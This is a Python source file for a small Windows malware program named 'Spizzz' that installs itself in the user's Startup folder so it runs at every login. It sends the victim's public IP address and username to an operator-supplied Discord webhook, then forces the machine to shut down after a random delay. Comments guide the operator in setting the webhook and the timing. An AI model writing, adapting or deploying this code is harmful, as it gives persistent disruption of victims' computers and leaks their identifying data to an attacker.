import os
from os.path import isfile
from os import getenv, startfile
import random
import requests
from shutil import copy
from urllib.request import Request, urlopen
from json import loads

path = "%s/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/spizzz.pyw" % getenv("userprofile")

if not isfile(path):
    copy(__file__, path)
    startfile(path)
    exit()
elif __file__.replace('\\', '/') != path.replace('\\', '/'):
    exit()

class spizzz :

    ticks = random.randint(300,1800) # Change the two random time limits to shut down the pc (example : ticks = random.randint(1,10) | there, the computer will shut down randomly between 1 and 10 seconds)
    ip = loads(urlopen(Request('http://ipinfo.io/json')).read())['ip']
    computer_username = getenv("username")


    url = "YOUR WEBHOOKS ADRESS HERE" # Here, put the address of your discord webhooks. (example : https://discord.com/api/webhooks/fullnumbersandletters)


    embed = {
        "title": "Spizzz is now active on the victim's pc :",
        "color": 0x53C33C,
        "fields": [
            {
                "name": "**ShutDown :**",
                        "value": f"__Shutdown in :__ {ticks} seconds",
                        "inline": True
            },
            {
                "name": "**Additional Info :**",
                        "value": f"__IP Adress:__ {ip}\n__PC User :__ {computer_username}",
                        "inline": True
            }
        ],
        "footer" : {"text" : "Spizz, by LikAnda"},
        }

    data = {
        "content": "",
        "username": "",
        "embeds": [
            embed
            ],
    }

    result = requests.post(url, json = data)
    try:
        result.raise_for_status()
    except requests.exceptions.HTTPError as err:
        print(err)
    else:
        print("Payload delivered successfully, code {}.".format(result.status_code))

    os.system(f"shutdown /s /t {ticks}") # The shutdown command